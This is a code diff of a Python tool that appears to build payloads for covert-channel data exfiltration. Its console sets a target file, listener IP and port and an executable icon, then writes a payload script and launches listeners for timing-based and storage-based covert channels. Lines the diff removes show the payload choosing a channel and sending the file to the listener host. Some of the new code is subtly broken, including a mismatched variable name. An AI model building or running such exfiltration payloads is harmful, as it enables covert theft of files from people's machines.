@@ -6,12 +6,11 @@ import socket
 import ListenerActiveStorage
 import ListenerSocketTiming
 import subprocess
-import PassiveServer
 
 
-filepath = "Hi.txt"
-port = 13001
-ip_addr = socket.gethostbyname(socket.gethostname())  ##gets the ip address of the host
+filepath = ""
+port = 12001
+ip_addr = socket.gethostbyname(socket.gethostname())
 
 
 #########Front End of the Porgram (Console)
@@ -22,12 +21,14 @@ def console():
 
     global filepath
     global port
+
+    ##gets the ip address of the host
     global ip_addr
 
     while(True):
         commands = input(">>").split()
 
-        #prints the help command 
+        #prints the help command
         if(commands[0] == "help"):
             print("""
     help                             - gives the user a list of coammnds to use
@@ -42,7 +43,7 @@ def console():
     icon [File.ico]                  - generate the icon for the paylaod (Needs to be in same directory as DGCC exe)
     run                              - give user the payload
                 """)
-            
+
 
         ##exist the program
         if(commands[0] == "exit"):
@@ -54,8 +55,8 @@ def console():
             print("filepath = " + str(filepath))
             print("")
 
-                
-        ## gives the user of the current parameters 
+
+        ## gives the user of the current parameters
         if(commands[0] == "status"):
             print("name = " + str(name))
             print("filepath = " + str(filepath))
@@ -84,7 +85,7 @@ def console():
             icon = commands[1]
             print("Icon = " + str(icon))
             print("")
-            
+
 
         ## resets the parameters
         if(commands[0] == "reset"):
@@ -92,13 +93,13 @@ def console():
             name = "payload"
             icon = "Default"
             ip_addr = socket.gethostbyname(socket.gethostname())
-            
 
-        ##deletes an item in a list 
+
+        ##deletes an item in a list
         if(commands[0] == "delete"):
             if(commands[1] == "filepath" or commands[1] == "FP"):
                 filepath = ""
-            
+
             if(commands[1] == "ip"):
                 ip_addr = ""
 
@@ -108,47 +109,20 @@ def console():
             else:
                 print("invalid input for args[1]")
                 continue
-                    
+
         ##cerates the payload
         if(commands[0] == "run"):
             return(filepath, name, ip_addr, port, icon)
-        
+
 
 def payload(fp, name, Ip, port):
     with open(str(name) + ".py", "w") as f:
         f.write("""
-from peterFitness import fitnessFunction
-from TargetSocketTiming import socketTiming
-from TargetActiveStorage  import activeStorage
+import DGCC
 
-ip_addr = '""" + str(Ip) + """'
+filepath = """ +  " r'"  +str(fp) +  "' " + """
+Targetip = """ +  " '" + str(Ip) + "' " +"""
 port = """ + str(port) + """
-filepath = '""" + str(fp) + """'
-
-
-
-if __name__ == "__main__":
-    pingThreshhold=64
-    sizeThreshhold=2048
-    trafficThreshold=1024
-
-    print("gathering network statistics...")
-    isPingHigh, isSizeHigh, isTrafficHigh = fitnessFunction(ip_addr, filepath, pingThreshhold, sizeThreshhold, trafficThreshold)
-    print("gathered\\n")
-
-
-    if (not isSizeHigh and not isPingHigh):
-        print("socket")
-        socketTiming(port, filepath)
-
-    elif (isTrafficHigh):
-        print("piggback storage")
-        piggybackStorage(ip_addr, port, filepath)
-
-    else:
-        print("active storage")
-        print("ip_addr")
-        activeStorage(ip_addr, port, filepath)
 
 """)
 
@@ -169,12 +143,21 @@ def makeexe(name, icon):
 
 def liseners(ip, port):
     subprocess.Popen('python ListenerSocketTiming.py ' + str(ip) + ' ' + str(port), creationflags=subprocess.CREATE_NEW_CONSOLE) # Timing Channel
-    subprocess.Popen('python ListenerActiveStorage.py '+ str(port), creationflags=subprocess.CREATE_NEW_CONSOLE) #ActiveStorage
-    subprocess.Popen('python PassiveServer.py ' + str(ip) + ' ' + str(port), creationflags=subprocess.CREATE_NEW_CONSOLE) #PiggybackStorage 
+    subprocess.Popen('python ListenerActiveStorage.py '+ str(port), creationflags=subprocess.CREATE_NEW_CONSOLE) #PiggybackStorage
 
 
 if __name__ == '__main__':
+    noExe = True
+
     (filepath, name, Ip, port, icon) = console()
     payload(filepath, name, Ip, port)
-    makeexe(name, icon)
+
+    if(not noEXE):
+        makeexe(name, icon)
+    else:
+        with open("variables.txt", "w") as f:
+            f.write(filepath)
+            f.write(port)
+            f.write(ip_addr)
+
     liseners(Ip, port)
